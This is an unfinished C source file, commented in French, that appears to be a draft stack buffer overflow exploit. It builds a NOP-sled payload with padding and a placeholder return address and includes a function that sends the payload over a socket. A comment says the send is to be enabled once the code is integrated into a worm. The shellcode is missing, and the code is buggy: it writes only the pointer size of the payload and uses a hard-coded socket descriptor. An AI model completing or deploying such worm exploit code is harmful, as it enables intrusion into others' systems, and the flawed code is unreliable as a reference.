#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h> // inet_addr()
#include <sys/socket.h>
#include <unistd.h> 
#define MAX 80

// Voir fonction strcat pour concaténer des chars (string.h)

int func(int sockfd, char *pay)
{
	printf("Overflow en cours...");
	int verif = write(sockfd, pay, sizeof(pay));
	if (verif == -1){
		printf("Error : Payload sending failed\n");
	}
	else {
		printf("Payload successfully send !\n");
	}
	return verif;
}

/*unsigned long get_sp(void) {
__asm__("movq %rsp,%rax");
}
long l=get_sp();
printf("Ox%lu\n", l);
*/

int main (int argc, char *argv[]){

	int sockfd = 1; // A CHANGER ET METTRE L'ARG DE LA FCT A LA PLACE 
	
    // Ecriture en dur du shellcode : 
    // NOP *40(etc 1 octet chaque)
	// + shellcode (taille à définir POUR TAILLE BOF) 
    // + "A" *4(1 octet chaque)
	// + @retour_dans_nop (== @relatif A CHERCHER GDB BASE PILE - [size(shellcode) + 4* A + moitié Nop])
    char payload[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x42\x41\x41\x41\x41\x40"; // A COMPLETER

    // COMMENT @retour = @base pile + taille instruction ENTIERE

    // Envoi de la payload
	//int over_flow = func(sockfd, payload);  // A DECOMMENTER UNE FOIS INTEGREE DANS LE VERS

    printf("%s\n", payload);
	printf("OK\n");
    return 0;
}